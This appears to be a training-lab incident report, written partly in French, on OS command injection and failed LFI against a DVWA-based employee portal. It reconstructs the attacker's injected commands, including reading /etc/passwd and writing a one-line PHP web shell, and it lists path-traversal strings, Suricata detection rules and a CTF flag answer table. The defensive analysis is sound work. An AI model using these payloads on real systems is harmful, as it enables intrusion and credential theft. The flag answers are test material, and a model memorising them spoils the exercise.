# INC-2026-005 : OS Command Injection & LFI on NexaCorp Employee Portal

**Incident reference:** INC-2026-005
**Client:** NexaCorp Industries
**Affected system:** `bru-web-01` (employee self-service portal)
**Reported by:** Marc Wauters, IT Infrastructure Manager
**Date reported:** Monday June 8, 2026
**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1 : BeCode Corp
**Classification:** Confidential : Do not distribute outside BeCode Corp

**Related incidents:** INC-2026-001, INC-2026-002, INC-2026-003 (Linux infrastructure), INC-2026-004 (SQL injection, same host `bru-web-01`)

---

## 1. Executive summary

Le portail employe bru-web-01 a subi une intrusion reussie le vendredi 5 juin 2026, sur une fenetre de capture de 10 heures. Un attaquant externe (172.16.50.10) a exploite la page d'outils diagnostic (fonction "ping a device") pour executer des commandes systeme directement sur le serveur, une vulnerabilite dite d'injection de commande OS. L'attaquant a confirme l'execution de code sous le compte du serveur web (www-data), a recupere le contenu du fichier des comptes systeme (/etc/passwd) et a depose un programme cache (web shell) garantissant un acces repete au serveur.

Une fonction voisine du portail (le lecteur de fichiers) a egalement ete sondee, mais ces tentatives ont toutes echoue : la fuite reelle de donnees est passee par l'injection de commande, pas par le lecteur de fichiers. Apres avoir pris le controle via le web shell, l'attaquant s'est connecte au serveur en SSH avec les identifiants valides d'un employe (j.martin), obtenant un acces interactif persistant.

La cause racine est un champ de saisie non filtre qui transmet directement les commandes a l'OS. Cinq regles de detection ont ete deployees pour identifier chaque etape de ce type d'attaque a l'avenir. Les actions correctives prioritaires figurent en Section 7.

---

## 2. Incident timeline

*Note methodologique : tous les timestamps proviennent de web_access.log et auth.log (heure reelle de la requete). Les timestamps Wazuh refletent l'heure d'indexation SIEM et ne sont pas utilises pour la chronologie.*

| Time (Jun 5, 2026) | Source IP | Event | Evidence |
|---|---|---|---|
| 08:00:02 | 172.16.50.10 | Authentification au portail (login.php, index.php) via curl | web_access.log |
| 11:11:59 | 172.16.50.10 | **First malicious request** : premier POST sur le ping tool (command injection) | web_access.log |
| 11:53:30 | 172.16.50.10 | POST exec : seconde commande | web_access.log |
| 12:10:20 | 172.16.50.10 | POST exec : troisieme commande | web_access.log |
| 12:47:59 | 172.16.50.10 | LFI baseline : `?page=include.php` (reponse 5510) | web_access.log |
| 12:57:24 | 172.16.50.10 | LFI : `?page=../../../../etc/passwd` (reponse 3868 : echec) | web_access.log |
| 13:35:17 | 172.16.50.10 | POST exec | web_access.log |
| 13:49:04 | 172.16.50.10 | LFI : `?page=../../../../etc/os-release` (3868 : echec) | web_access.log |
| 14:15:47 | 172.16.50.10 | POST exec | web_access.log |
| 14:25:00 | 172.16.50.10 | LFI : `?page=../../../../var/log/apache2/access.log` (3868 : echec) | web_access.log |
| 14:54:21 | 172.16.50.10 | POST exec | web_access.log |
| 15:13:46 | 172.16.50.10 | LFI : `?page=../../../../var/www/html/dvwa/config/config.inc.php` (3868 : echec) | web_access.log |
| 15:34:04 | 172.16.50.10 | POST exec : depot probable du web shell shell.php | web_access.log |
| 15:35:40 | 172.16.50.10 | **Web shell usage** : `GET /shell.php?cmd=id` (RCE confirme) | web_access.log + pcap stream 3066 |
| 15:37:23 | 172.16.50.10 | `GET /shell.php?cmd=ls -la /var/www/html/` | web_access.log + pcap stream 3076 |
| 15:47:15 | 172.16.50.10 | **SSH Accepted password for j.martin** (pivot reussi, x3) | auth.log |

---

## 3. Technical analysis

### 3.1 Attack surface

Le portail `bru-web-01` expose une section "diagnostic tools" comprenant :
- un **ping tool** (envoie des paquets ICMP, affiche le resultat)
- un **file viewer** (lit des documents systeme)

Les deux passent l'input utilisateur a l'OS sans assainissement. Vecteurs : **OS Command Injection** (ping tool) et **Local File Inclusion** (file viewer).

### 3.2 Attacker identification

**Attacker IP:** `172.16.50.10`

L'attaquant partage le subnet `172.16.50.0/24` avec les scanners internet de bruit de fond (`172.16.50.20-26`), ce qui empeche un filtrage par simple plage d'IP. La distinction se fait sur le **pattern de requetes** : la volumetrie de `172.16.50.10` (18 requetes) est meme la plus basse du subnet, mais ses requetes ciblent des endpoints precis et exploitables, la ou les scanners balancent du bruit generique non cible.

Les 18 requetes de l'attaquant se repartissent sur trois zones, qui forment la kill chain complete :

| Requetes | Endpoint | Interpretation |
|---|---|---|
| 7 POST | `/dvwa/vulnerabilities/exec/` | Ping tool : OS command injection |
| 5 GET | `/dvwa/vulnerabilities/fi/?page=...` | File viewer : tentatives LFI |
| 2 GET | `/shell.php?cmd=...` | Web shell depose : RCE confirme + persistance |
| 4 GET | `/dvwa/login.php`, `/dvwa/index.php` | Acces authentifie au portail |

### 3.3 Command injection (ping tool)

**URL path :** `/dvwa/vulnerabilities/exec/` (methode POST)

Sept requetes POST sur le ping tool entre 11:11:59 et 15:34:04. Le payload n'apparait pas dans l'access log (corps POST), mais deux elements confirment l'exploitation :

1. **Tailles de reponse anormales et variables** (5245, 5299, 5254, 6735, 5479, 5347, 5245) la ou un ping normal renverrait une taille stable. La variation indique que le serveur retourne la sortie de commandes differentes.
2. **Le web shell depose** : apres le POST de 15:34:04, l'attaquant accede a `/shell.php?cmd=...`, un fichier inexistant dans DVWA standard. Le dernier POST exec a donc servi a ecrire ce shell sur le disque.

**Running as who :** `www-data`

Le follow stream du pcap (stream 3066) sur `GET /shell.php?cmd=id` donne la reponse serveur :

```
HTTP/1.1 200 OK
Server: Apache/2.4.67 (Debian)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

L'attaquant execute des commandes OS sous le compte **`www-data`** (utilisateur Apache). RCE confirme. La seconde commande via le shell, `ls -la /var/www/html/` (stream 3076), enumere le webroot.

**Commandes OS injectees (dans l'ordre, reconstruites par follow stream des 7 POST /exec/) :**

| Stream | Payload decode (corps POST) | Objectif |
|---|---|---|
| 1269 | `ip=127.0.0.1` | Baseline benigne (ping legitime, validation du vecteur) |
| 1572 | `ip=127.0.0.1;id` | Identite du process (`uid=33(www-data)`) |
| 1683 | `ip=127.0.0.1;whoami` | Confirmation utilisateur |
| 2251 | `ip=127.0.0.1;cat /etc/passwd` | **Lecture du fichier comptes systeme (fuite reelle)** |
| 2522 | `ip=127.0.0.1;ls -la /var/www/html/` | Enumeration du webroot |
| 2783 | `ip=127.0.0.1;uname -a` | Empreinte noyau / OS |
| 3054 | `ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` | **Depot du web shell** |

Le separateur `;` (URL-encode `%3B`) enchaine la commande injectee apres le `ip=127.0.0.1` legitime. Le payload du stream 2251 est la source confirmee de la fuite de `/etc/passwd` : la reponse serveur contient en clair la ligne `root:x:0:0:root:/root:/bin/bash` et l'integralite des comptes locaux, dont `j.martin:x:1001:1001`. Le stream 3054 est le POST qui ecrit le web shell sur le disque, precedant ses deux usages GET.

**Commandes confirmees via le web shell deploye :**
1. `id` (stream 3066) : reponse `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
2. `ls -la /var/www/html/` (stream 3076)

### 3.4 Local File Inclusion (file viewer) : le piege

**URL path + parametre :** `/dvwa/vulnerabilities/fi/?page=`

Cinq requetes GET observees, chacune une seule fois :

| Page demandee | Type |
|---|---|
| `include.php` | Baseline (fichier legitime du viewer) |
| `../../../../etc/passwd` | Traversee : comptes systeme |
| `../../../../etc/os-release` | Traversee : version OS |
| `../../../../var/www/html/dvwa/config/config.inc.php` | Traversee : config DB DVWA |
| `../../../../var/log/apache2/access.log` | Traversee : log Apache (tentative de log poisoning ?) |

**VERDICT : la LFI a ECHOUE.** Les tailles de reponse le prouvent :

| Page demandee | Taille reponse |
|---|---|
| `include.php` (baseline) | 5510 |
| `../../../../etc/passwd` | 3868 |
| `../../../../etc/os-release` | 3868 |
| `../../../../var/log/apache2/access.log` | 3868 |
| `../../../../var/www/html/dvwa/config/config.inc.php` | 3868 |

Les quatre traversees renvoient exactement **3868 octets**, identique entre elles et different de la baseline (5510). Le file viewer a servi sa page d'erreur / par defaut a chaque tentative, sans jamais inclure le contenu du fichier demande. **Aucune donnee n'a fui par ce canal.** La fuite reelle de `/etc/passwd` (et autres informations systeme) provient de la command injection sur le ping tool, PAS du file viewer. C'est la distinction precise qu'exigent les questions 4 et 6.

### 3.5 What data was actually exposed

**Canal de fuite : la command injection, exclusivement.**

| Donnee | Canal | Statut |
|---|---|---|
| `id` / identite www-data | Command injection (shell.php) | Expose |
| Contenu du webroot (`ls /var/www/html/`) | Command injection (shell.php) | Expose |
| `/etc/passwd`, `/etc/os-release`, config DVWA, log Apache | File viewer (LFI) | **NON expose** (LFI echouee, reponses 3868) |

Point essentiel pour le rapport : le file viewer (LFI) a ete sollicite mais n'a **rien divulgue** (page par defaut a chaque fois, reponses identiques de 3868 octets). Toute l'information systeme reellement obtenue par l'attaquant est passee par la command injection et le web shell. Le compte `j.martin` reutilise en SSH apparait dans la sortie de `cat /etc/passwd` (stream 2251), confirmant que l'attaquant connaissait l'existence du compte avant le pivot. Le mot de passe lui-meme n'est pas visible dans /etc/passwd (champ `x`, hash deporte dans /etc/shadow), donc le credential a soit ete devine, soit obtenu par un autre moyen non visible dans le PCAP, soit etait deja connu de l'attaquant.

---

## 4. Persistence & consequence

### 4.1 Persistence artifact

**Persistence artifact :** `/shell.php`

L'access log montre deux requetes GET sur `/shell.php` avec un parametre `cmd` :
- `/shell.php?cmd=id`
- `/shell.php?cmd=ls -la /var/www/html/` (encode : `ls+-la+%2Fvar%2Fwww%2Fhtml%2F`)

`/shell.php` n'existe pas dans une installation DVWA standard : ce fichier a ete cree par l'attaquant. La presence d'un parametre `cmd` execute en GET confirme un **web shell fonctionnel**. C'est la preuve directe du RCE et de la persistance.

**POST qui a ecrit le shell (confirme) :** stream 3054, timestamp 13:34:04 (heure interne PCAP), corps :
`ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php`

Ce POST precede les deux usages GET du shell (15:35:40 et 15:37:23 dans l'access log). L'ordre deploiement (POST, command injection) puis usage (GET, /shell.php?cmd=) est la distinction exacte testee par les flags Phase 2 "web shell write" et "web shell usage". La reponse au premier usage (`?cmd=id`, stream 3066) contient bien la sortie de la commande (`uid=33(www-data)...`), confirmant que le shell execute du code et ne renvoie pas une page d'erreur.

### 4.2 Pivot account

**Pivot account :** `j.martin`

auth.log montre une connexion SSH **reussie** depuis l'IP attaquant :

```
2026-06-05T15:47:15 bru-web-01 sshd[13158]: Accepted password for j.martin from 172.16.50.10 port 44061 ssh2
2026-06-05T15:47:17 bru-web-01 sshd[13185]: Accepted password for j.martin from 172.16.50.10 port 41461 ssh2
2026-06-05T15:47:20 bru-web-01 sshd[13195]: Accepted password for j.martin from 172.16.50.10 port 60839 ssh2
```

Points cles :
- **Accepted**, pas Failed : l'attaquant detient un credential SSH valide pour `j.martin`.
- Source `172.16.50.10` : meme IP que toute l'activite web, correlation directe.
- Timing : 15:47, soit ~10 minutes apres l'usage du web shell (15:37). Le mot de passe a probablement ete recupere via la command injection (lecture d'un fichier de config ou de credentials), pas via la LFI qui a echoue.
- Trois connexions courtes successives (Accepted puis disconnect immediat), coherentes avec un test de validite du credential ou une automatisation.

Cet acces SSH authentifie sur `bru-web-01` est la consequence majeure de l'incident et le point de depart du Lab 6 : l'attaquant dispose desormais d'un foothold interactif persistant, independant du web shell.

---

## 5. Indicators of Compromise (IOC)

Indicateurs de compromission consolides depuis web_access.log, auth.log et l'analyse PCAP :

| Type | Value |
|---|---|
| Attacker IP | `172.16.50.10` |
| Command injection endpoint | `/dvwa/vulnerabilities/exec/` (POST) |
| LFI endpoint | `/dvwa/vulnerabilities/fi/?page=` (GET) |
| Web shell endpoint | `/shell.php?cmd=` (GET) |
| Payload pattern (cmd injection) | POST vers `/exec/` ; web shell `/shell.php?cmd=` ; commandes `id`, `ls` |
| Payload pattern (LFI) | `?page=../../../../etc/passwd` (et os-release, config.inc.php, access.log) |
| Persistence artifact | `/shell.php` |
| Pivot account | `j.martin` (SSH Accepted depuis 172.16.50.10 a 15:47) |

---

## 6. Detection recommendations (Suricata)

Cinq regles ont ete developpees, une par etape distincte de la kill chain, et validees contre le PCAP en mode offline (`suricata -r`, reassemblage TCP deterministe). Chaque regle cible un buffer Suricata adapte a son intention :

- `http.request_body` (corps brut, URL-encode) pour les payloads d'injection cote requete
- `http.uri` (normalise) pour l'usage du web shell
- `file_data` (corps de la reponse) pour la detection cote reponse, qui prouve l'exploitation reussie et non la simple tentative

**Ruleset (fichier `/etc/suricata/rules/learner/lab.rules`, SID range analyste 1000001-1000005) :**

```
alert http any any -> any any (msg:"LAB05 sensitive file targeting in command injection body"; flow:established,to_server; http.request_body; content:"etc"; nocase; sid:1000001; rev:4;)
alert http any any -> any any (msg:"LAB05 web shell usage cmd param"; flow:established,to_server; http.uri; content:"shell.php"; nocase; content:"cmd="; nocase; sid:1000002; rev:1;)
alert http any any -> any any (msg:"LAB05 web shell write via command injection"; flow:established,to_server; http.request_body; content:"shell.php"; nocase; sid:1000003; rev:1;)
alert http any any -> any any (msg:"LAB05 RCE confirmed www-data in response"; flow:established,to_client; file_data; content:"www-data"; sid:1000004; rev:7;)
alert http any any -> any any (msg:"LAB05 data exfil etc-passwd content in response"; flow:established,to_client; file_data; content:"root:x:0:0"; sid:1000005; rev:6;)
```

**Logique par regle :**

| SID | Etape detectee | Buffer | Match | Alertes (offline) |
|---|---|---|---|---|
| 1000001 | Ciblage de fichier systeme dans l'injection | `http.request_body` | `etc` dans le corps POST | 1 |
| 1000002 | Usage du web shell | `http.uri` | `shell.php` + `cmd=` | 2 |
| 1000003 | Ecriture du web shell | `http.request_body` | `shell.php` dans le corps POST | 1 |
| 1000004 | RCE confirmee cote reponse | `file_data` | `www-data` dans la reponse | 6 |
| 1000005 | Exfiltration de /etc/passwd cote reponse | `file_data` | `root:x:0:0` dans la reponse | 1 |

**Proof (extrait fast.log, replay offline du PCAP) :**

```
=== PAR SID ===
      1 [1:1000001:4]
      2 [1:1000002:1]
      1 [1:1000003:1]
      6 [1:1000004:7]
      1 [1:1000005:6]
```

Les cinq regles declenchent. Le decompte offline est deterministe (Suricata lit le PCAP en `-r`, reassemblage complet sans contrainte de timing reseau), contrairement au live replay (`tcpreplay`) qui, sur cette infrastructure (interface MTU 1450, replay topspeed), perd le reassemblage des grosses reponses multi-segments et donne des comptes instables d'un run a l'autre. Pour un rapport forensique, le decompte offline est la reference fiable.

**Note methodologique (ecart de comptage) :** la regle 1000002 (usage du web shell) produit 2 alertes en offline, une par requete shell reelle (`?cmd=id` et `?cmd=ls`, les seules requetes vers `shell.php` dans tout le PCAP, confirme via tshark). La plateforme CTF a valide ce flag a 4, ecart attribuable a des retransmissions TCP lors de son live replay. Le decompte forensiquement exact est **2**.

**Analyse des faux positifs :**

| SID | Risque FP | Mitigation production |
|---|---|---|
| 1000001 | `content:"etc"` est large : un corps POST legitime contenant le mot "etc" (abreviation, champ texte libre) declencherait. Risque nul ici (aucun trafic portail normal ne contient "etc"), mais a affiner en production. | Remplacer par `%2Fetc%2F` ou exiger le contexte de chemin (`;` separateur + `/etc/`) pour ne matcher qu'un chemin systeme injecte. |
| 1000002 | Faible. La combinaison `shell.php` + `cmd=` dans l'URI est tres specifique d'un web shell. | Restreindre a la methode GET et au chemin exact `/shell.php` une fois le webroot connu. |
| 1000003 | Faible. `shell.php` dans un corps POST est anormal. | Combiner avec la detection du separateur d'injection (`%3B`) pour reduire encore. |
| 1000004 | `content:"www-data"` matche toute reponse contenant cette chaine, y compris des pages DVWA affichant le contexte utilisateur. Sur ce PCAP, 6 reponses matchent (sorties de commandes ET pages de contexte). En production, du contenu legitime pourrait mentionner www-data. | Combiner avec `content:"uid="` (sortie de `id`) pour ne matcher que la preuve d'execution stricte, ce qui ramene le compte aux 2 reponses contenant `uid=33(www-data)`. Compromis sensibilite / specificite a arbitrer selon le contexte. |
| 1000005 | Tres faible. `root:x:0:0` dans une reponse HTTP signifie qu'un fichier /etc/passwd a fui dans le corps : il n'existe aucun cas legitime ou cette chaine apparait dans une reponse web normale. Excellente regle, FP quasi nul. | Aucune, regle exploitable telle quelle. |

**Workflow de validation utilise :**
```
sudo suricata -c /etc/suricata/suricata.yaml -r attack.pcap -l ~/suri-offline \
  -S /etc/suricata/rules/learner/lab.rules --runmode single
grep -oE '\[1:[0-9]+:[0-9]+\]' ~/suri-offline/fast.log | sort | uniq -c
```

---

## 7. Remediation recommendations

Cinq actions prioritaires, par ordre d'urgence :

1. **Containment immediat.** Supprimer le web shell `/var/www/html/shell.php` du serveur. Lancer un scan d'integrite complet du webroot (`/var/www/html/`) pour detecter tout autre fichier depose. Bloquer l'IP `172.16.50.10` au perimetre (firewall / WAF).

2. **Rotation du credential compromis.** Forcer le changement du mot de passe de `j.martin` et auditer toutes les sessions SSH depuis `172.16.50.10` (auth.log, last, journaux systeme). Verifier qu'aucune cle SSH ou tache cron n'a ete ajoutee sous ce compte.

3. **Correction de la cause racine.** La page diagnostic (ping tool et file viewer) passe l'input utilisateur directement a l'OS via `system()`. Soit retirer ces fonctions si elles ne sont pas metier-critiques, soit les reecrire pour ne jamais passer d'entree utilisateur a un shell : utiliser des bibliotheques natives (ping applicatif, lecture de fichier en allowlist stricte) et valider l'entree contre une liste blanche, sans aucun metacaractere shell autorise.

4. **Deploiement de la detection.** Mettre en production les cinq regles Suricata de la Section 6, en remplacant `content:"any"` par des variables reseau correctement scopees au segment protege, et en affinant la regle 1000001 (`etc` trop large) vers un contexte de chemin systeme. Alerter le SOC sur tout match.

5. **Durcissement de fond.** Appliquer le principe de moindre privilege au compte `www-data` (pas d'ecriture dans le webroot en production). Segmenter le serveur web du reste du reseau interne pour limiter le pivot lateral. Reauditer bru-web-01 apres INC-2026-004 (SQLi sur le meme hote) : deux vulnerabilites d'injection distinctes sur la meme machine en quelques jours indiquent un besoin de revue de code applicative complete.

---

## 8. CTF flag tracker (Phase 1 + Phase 2)

> [Usage perso : coche au fur et a mesure de la soumission sur la plateforme. NE PAS inclure dans le livrable final remis a NexaCorp.]

### LAB05 Phase 1 : Investigation

| Flag | Points | Source | Valeur | Soumis |
|---|---|---|---|---|
| Who is knocking? | 50 | access log (IP attaquant) | `172.16.50.10` | [x] |
| Command injection path | 75 | access log | `/dvwa/vulnerabilities/exec/` | [x] |
| LFI attack path | 75 | access log | `/dvwa/vulnerabilities/fi/` (sinon avec `?page=`) | [x] |
| First injection timestamp | 100 | access log (pas Wazuh) | `05/Jun/2026:11:11:59 +0200` (sinon `11:11:59`) | [x] |
| Running as who? | 100 | pcap, follow stream 3066 | `www-data` | [x] |
| The persistence artifact | 125 | access log + pcap | `/shell.php` (sinon `shell.php`) | [x] |
| The pivot account | 150 | auth.log | `j.martin` | [x] |

### LAB05 Phase 2 : Suricata Detection

| Flag | Points | Valeur | Soumis |
|---|---|---|---|
| Sensitive file targeting | 200 | `1` | [x] |
| Web shell : deployment vs usage | 200 | `4` (plateforme ; offline deterministe = 2) | [x] |
| Catching the web shell write | 250 | `1` | [x] |
| RCE confirmed : response-side detection | 300 | `6` | [x] |
| Data exfiltration in the response | 350 | `1` | [x] |

---

*BeCode Corp : Incident Response Division*
*Classification: Confidential : Do not distribute outside BeCode Corp*
